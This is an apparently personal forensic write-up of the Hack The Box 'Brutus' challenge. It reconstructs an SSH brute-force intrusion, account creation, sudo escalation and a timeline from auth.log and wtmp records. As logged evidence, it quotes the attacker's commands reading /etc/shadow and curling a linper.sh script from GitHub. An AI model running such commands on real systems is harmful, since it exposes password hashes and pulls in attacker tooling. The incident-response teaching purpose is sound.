
<h1 align="center">
  🕵️ Brutus - HTB Sherlock
</h1>

<p align="center">
  <strong>BLUE TEAM · DIGITAL FORENSICS · INCIDENT RESPONSE</strong>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Hack%20The%20Box-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=black">
  <img src="https://img.shields.io/badge/Category-Sherlock-blue?style=for-the-badge">
  <img src="https://img.shields.io/badge/Focus-Log%20Analysis-purple?style=for-the-badge">
</p>

---

## 📌 Challenge Overview

### Sherlock Scenario

In this Sherlock, the objective is to become familiar with Unix authentication logs (`auth.log`) and login records (`wtmp`).

The investigation focuses on a Confluence server that was targeted through its SSH service using a brute-force attack.

After successfully gaining access to the server, the attacker performed additional activities that can be reconstructed through forensic analysis of the available logs.

Throughout this investigation, we explore how authentication logs can provide valuable insights into:

- SSH brute-force attacks
- Successful authentication attempts
- Privilege escalation
- Persistence mechanisms
- Command execution activity
- Historical login sessions

The investigation also explores how `wtmp` records can help reconstruct user login sessions and establish an attack timeline.

---

## 🎯 Investigation Objectives

- Analyze Unix authentication logs.
- Identify SSH brute-force activity.
- Determine whether unauthorized access was successful.
- Investigate suspicious authentication events.
- Identify privilege escalation techniques.
- Examine persistence mechanisms.
- Reconstruct the attack timeline using forensic artifacts.
- Correlate authentication events with historical login sessions.

---

## ⚙️ Environment Setup

### 1. Extracting the Evidence

Initially, the standard `unzip` utility failed to extract the archive due to an unsupported compression method.

**Command:**

```bash
unzip Brutus.zip
````

To successfully extract the files, I used `7z`:

bash

```bash
7z x Brutus.zip
```

After entering the archive password, the extraction completed successfully.

Extracted files:

| File | Description |
| --- | --- |
| `auth.log` | Unix authentication and system activity logs |
| `wtmp` | Binary records of user login sessions |
| `utmp.py` | Python utility for parsing utmp/wtmp records |

## 🔍 Investigation & Log Analysis

### 1. WTMP File Conversion

The `wtmp` file stores binary records containing information about user login sessions.

To make its contents easier to analyze, I used the provided Python script.

Command:

bash

```bash
python3 utmp.py wtmp -o wtmp.txt
```

This command processes the binary `wtmp` file and saves the parsed output into `wtmp.txt`.

### 2. Initial Auth.log Analysis

I started by examining the first entry of `auth.log`.

Command:

bash

```bash
head -1 auth.log
```

Output:

text

```text
Mar  6 06:18:01 ip-172-31-35-28 CRON[1119]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
```

This entry provides several important details:

| Field | Value |
| --- | --- |
| Date | March 6 |
| Time | 06:18:01 |
| Hostname | ip-172-31-35-28 |
| Process | CRON |
| PID | 1119 |
| Service | pam\_unix |
| User | confluence |
| UID | 998 |
| Initiated by | UID 0 (root) |

The log indicates that a CRON session was opened for the `confluence` user by a process running with root privileges.

This is an example of normal system activity that provides context for the subsequent investigation.

### 3. Process Enumeration

To get an overview of the activity recorded in `auth.log`, I extracted the process names and counted their occurrences.

Command:

bash

```bash
awk '{print $5}' auth.log | sed 's/[\[\:].*//g' | sort | uniq -c
```

Results:

| Process | Count |
| --- | --- |
| `sshd` | 257 |
| `CRON` | 104 |
| `systemd-logind` | 8 |
| `sudo` | 6 |
| `groupadd` | 3 |
| `systemd` | 2 |
| `usermod` | 2 |
| `useradd` | 1 |
| `passwd` | 1 |
| `chfn` | 1 |

The high number of SSH-related entries makes `sshd` a primary focus of the investigation.

The presence of account management utilities, particularly `useradd` and `usermod`, also indicates changes to the system's user configuration.

These events require further investigation to determine whether they are associated with legitimate administration or suspicious activity.

### 4. Suspicious User Creation

To investigate account creation events, I searched for `useradd` entries.

Command:

bash

```bash
grep useradd auth.log
```

Output:

text

```text
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
```

The logs reveal the creation of a new account named `cyberjunkie`.

Account details:

| Attribute | Value |
| --- | --- |
| Username | `cyberjunkie` |
| UID | `1002` |
| GID | `1002` |
| Home directory | `/home/cyberjunkie` |
| Shell | `/bin/bash` |
| Terminal | `/dev/pts/1` |
| Timestamp | March 6, 06:34:18 |

This account creation represents a potential persistence mechanism, allowing an attacker to maintain access through a newly created account.

MITRE ATT&CK Mapping:

| Technique | ID | Description |
| --- | --- | --- |
| Create Account | T1136 | Creating an account to maintain access |
| Local Account | T1136.001 | Creating a local account on the compromised system |

The identified sub-technique is T1136.001 – Create Account: Local Account.

### 5. Privilege Escalation

Next, I examined changes to user group membership.

Command:

bash

```bash
grep usermod auth.log
```

Output:

text

```text
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
```

The `cyberjunkie` account was added to the `sudo` group.

This modification grants the account the ability to execute commands with elevated privileges, subject to the system's sudo configuration.

The event occurred approximately one minute after the account was created.

This is a significant finding because it demonstrates that the newly created account was granted administrative capabilities shortly after its creation.

### 6. Sudo Command Analysis

To investigate commands executed with elevated privileges, I searched the authentication logs for sudo activity.

Command:

bash

```bash
grep sudo auth.log
```

First command:

bash

```bash
/usr/bin/cat /etc/shadow
```

The account `cyberjunkie` executed this command with root privileges.

The `/etc/shadow` file stores password hash information and other authentication-related data for local accounts.

Access to this file is sensitive because it contains authentication information that should normally be restricted to privileged users.

Second command:

bash

```bash
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

The attacker logged into the newly created `cyberjunkie` account and used its elevated privileges to retrieve a script from GitHub.

The script, named `linper.sh`, is associated with Linux privilege enumeration.

This activity suggests that the attacker was gathering additional information about the compromised system.

Full command executed using sudo:

bash

```bash
sudo /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

The authentication log records the command as:

text

```text
COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

This activity is consistent with post-compromise enumeration.

### 7. SSH Authentication Investigation

The next step was to investigate repeated SSH authentication failures.

I identified the IP address `65.2.161.68` in the authentication logs.

Command:

bash

```bash
grep 65.2.161.68 auth.log
```

Observed activity:

text

```text
Invalid user admin from 65.2.161.68
```

text

```text
pam_unix(sshd:auth): authentication failure
```

text

```text
Failed password for invalid user admin from 65.2.161.68
```

The logs reveal multiple authentication attempts originating from the same IP address.

Additional evidence shows that the SSH service reached its `MaxStartups` connection limit:

text

```text
drop connection #10 from [65.2.161.68] ... past MaxStartups
```

This indicates a high volume of simultaneous unauthenticated SSH connections.

The repeated failures and invalid username attempts are consistent with SSH brute-force activity.

The source IP address `65.2.161.68` becomes particularly important when correlating these authentication events with the login sessions recorded in `wtmp`.

### 8. WTMP Analysis

To investigate user login sessions, I analyzed the converted `wtmp` file.

Command:

bash

```bash
cat wtmp.txt
```

The parsed output contains several session-related event types.

| Event | Description |
| --- | --- |
| `USER` | Records a user login session |
| `DEAD` | Indicates a terminated session |
| `BOOT_TIME` | Records system startup |
| `RUN_LVL` | Records a system runlevel change |
| `LOGIN` | Indicates login process activity |
| `INIT` | Records login process initialization |

#### 8.1 Historical Login Sessions

The first records show previous login activity on the system.

Identified login sessions:

| Date | Username | Source IP | Terminal |
| --- | --- | --- | --- |
| 2024-01-25 11:13:58 | ubuntu | 203.101.190.9 | pts/0 |
| 2024-01-25 11:15:40 | root | 203.101.190.9 | pts/0 |
| 2024-02-11 10:33:49 | root | 203.101.190.9 | pts/0 |
| 2024-02-11 10:41:11 | root | 203.101.190.9 | pts/1 |
| 2024-02-11 10:54:27 | root | 203.101.190.9 | pts/1 |

The records show multiple login sessions associated with the IP address `203.101.190.9`.

These entries provide historical context about system access before the March 6 incident.

Further correlation with `auth.log` is necessary to determine whether these sessions represent legitimate administrative activity or unauthorized access.

#### 8.2 Analysis of March 6 Login Events

The `wtmp.txt` output also contains login records from March 6.

Relevant entries:

text

```text
"USER" "1583" "pts/0" "ts/0" "root" "203.101.190.9" "0" "0" "0" "2024/03/06 06:19:55" "151913" "203.101.190.9"

"USER" "2549" "pts/1" "ts/1" "root" "65.2.161.68" "0" "0" "0" "2024/03/06 06:32:45" "387923" "65.2.161.68"

"DEAD" "2491" "pts/1" "" "" "" "0" "0" "0" "2024/03/06 06:37:24" "590579" "0.0.0.0"

"USER" "2667" "pts/1" "ts/1" "cyberjunkie" "65.2.161.68" "0" "0" "0" "2024/03/06 06:37:35" "475575" "65.2.161.68"
```

March 6 login details:

| Date | Username | Source IP | Terminal |
| --- | --- | --- | --- |
| 06:19:55 | root | 203.101.190.9 | pts/0 |
| 06:32:45 | root | 65.2.161.68 | pts/1 |
| 06:37:35 | cyberjunkie | 65.2.161.68 | pts/1 |

These records are particularly relevant to the investigation.

The `wtmp` file shows that a session associated with the IP address `65.2.161.68` was recorded under the username `root` at 06:32:45.

Later, at 06:37:35, another session from the same IP address was recorded under the newly created `cyberjunkie` account.

This establishes a connection between the suspicious source IP and the account created during the incident.

The `DEAD` record at 06:37:24 also indicates a session termination event involving `pts/1`.

However, the exact relationship between this termination event and the subsequent `cyberjunkie` session must be confirmed by correlating the original records.

#### 8.3 Correlation Between WTMP and Auth.log

Comparing both forensic artifacts provides a clearer understanding of the incident.

| Evidence | Auth.log | WTMP |
| --- | --- | --- |
| SSH authentication attempts | Records failed authentication attempts | Does not record individual failed passwords |
| Remote source IP | Identifies `65.2.161.68` | Identifies `65.2.161.68` |
| Account creation | Records creation of `cyberjunkie` | Shows a later session for `cyberjunkie` |
| Privilege changes | Records addition to the sudo group | Does not record group membership changes |
| Successful sessions | Provides authentication events | Records login sessions and terminals |
| Session termination | Provides related authentication activity | Records `DEAD` events |
| System startup | May contain system-related activity | Records `BOOT_TIME` |

The correlation between both files is important because `auth.log` provides authentication and account management details, while `wtmp` provides historical session information.

Together, these artifacts help reconstruct the sequence of events and establish a relationship between the suspicious IP address and the newly created account.

## ⏱️ Attack Timeline

| Timestamp | Event | Source |
| --- | --- | --- |
| Jan 25, 11:13:58 | Login as `ubuntu` from `203.101.190.9` | WTMP |
| Jan 25, 11:15:40 | Login as `root` from `203.101.190.9` | WTMP |
| Feb 11, 10:33:49 | Login as `root` from `203.101.190.9` | WTMP |
| Feb 11, 10:41:11 | Additional root login session | WTMP |
| Feb 11, 10:54:27 | Additional root login session | WTMP |
| Mar 6, 06:18:01 | CRON session opened for `confluence` | Auth.log |
| Mar 6, 06:19:55 | Root login from `203.101.190.9` | WTMP |
| Mar 6, 06:32:45 | Root login session from `65.2.161.68` | WTMP |
| Mar 6, 06:34:18 | `cyberjunkie` account created | Auth.log |
| Mar 6, 06:35:15 | `cyberjunkie` added to sudo group | Auth.log |
| Mar 6, 06:37:24 | Session termination recorded on `pts/1` | WTMP |
| Mar 6, 06:37:35 | Login as `cyberjunkie` from `65.2.161.68` | WTMP |
| Mar 6, 06:37:57 | `/etc/shadow` accessed using sudo | Auth.log |
| Mar 6, 06:39:38 | `linper.sh` requested using curl | Auth.log |
| Mar 6, 11:09:18 | System shutdown recorded | WTMP |

Timeline observations:

The most significant finding is the correlation between the IP address `65.2.161.68`, the root login session, and the subsequent `cyberjunkie` login.

The account was created at 06:34:18, added to the sudo group at 06:35:15, and subsequently appeared in a login session at 06:37:35.

This sequence strongly connects the account creation and privilege modification events with the suspicious remote access activity.

The available records also show that the system was shut down at 11:09:18.

## 🚩 Key Findings

The investigation identified several suspicious activities:

- Repeated SSH authentication failures originating from `65.2.161.68`.
- A root login session associated with `65.2.161.68`.
- Creation of a new account named `cyberjunkie`.
- Addition of the new account to the `sudo` group.
- A subsequent `cyberjunkie` login session from `65.2.161.68`.
- Access to `/etc/shadow` using elevated privileges.
- Retrieval of a Linux enumeration script from GitHub.
- Historical root login sessions associated with `203.101.190.9`.
- MITRE ATT&CK mapping to `T1136.001` (Local Account).

The correlation between `auth.log` and `wtmp` provides evidence of suspicious remote access, account creation, privilege modification and subsequent command execution.

The investigation demonstrates how authentication logs and session records can be combined to reconstruct an incident timeline.

## 🧰 Tools & Technologies

| Tool | Purpose |
| --- | --- |
| `7z` | Archive extraction |
| `Python3` | WTMP parsing |
| `awk` | Log field extraction |
| `grep` | Searching authentication events |
| `sed` | Text processing |
| `sort` | Sorting extracted data |
| `uniq` | Counting repeated entries |
| `cat` | Displaying parsed log records |
| `head` | Inspecting initial log entries |
| `less` | Log inspection |

## 📚 Lessons Learned

This investigation demonstrates the importance of correlating multiple forensic artifacts during a Linux incident response investigation.

Key lessons learned:

- `auth.log` provides valuable information about SSH authentication, account creation, privilege changes and sudo command execution.
- `wtmp` helps reconstruct historical user sessions and identify remote source IP addresses.
- Correlating authentication logs with login records provides stronger evidence than analyzing each artifact independently.
- Unexpected account creation and changes to privileged groups should be investigated immediately.
- Multiple SSH authentication failures can indicate brute-force activity.
- Historical login records can help distinguish previously established access from activity associated with a current incident.
- Session termination records can help establish the sequence of login events.
- A reliable attack timeline should combine multiple independent sources of evidence.

The investigation highlights how Linux authentication artifacts can be used to reconstruct attacker activity and identify suspicious access patterns.

## ⚠️ Disclaimer

This writeup documents my personal investigation of the Brutus Sherlock challenge from Hack The Box.

All analysis is conducted within an authorized educational environment.

The content is intended for educational purposes only.

Hack The Box and its trademarks belong to their respective owners.
